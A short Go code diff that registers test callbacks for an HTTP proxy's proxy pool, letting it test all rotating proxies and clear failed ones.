@@ -252,6 +252,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		},
 	)
 
+	// Register test callbacks for proxy pool
+	SetProxyPoolTestCallbacks(
+		// testAllProxies
+		func() (total, passed, failed int) {
+			if p.anonymityEngine == nil || p.anonymityEngine.proxyRotator == nil {
+				return 0, 0, 0
+			}
+			return p.anonymityEngine.proxyRotator.TestAllProxies()
+		},
+		// clearFailedProxies
+		func() int {
+			if p.anonymityEngine == nil || p.anonymityEngine.proxyRotator == nil {
+				return 0
+			}
+			return p.anonymityEngine.proxyRotator.ClearFailedProxies()
+		},
+	)
+
 	// Start session janitor for stale session cleanup (releases orphaned proxies)
 	go p.startSessionJanitor()
 
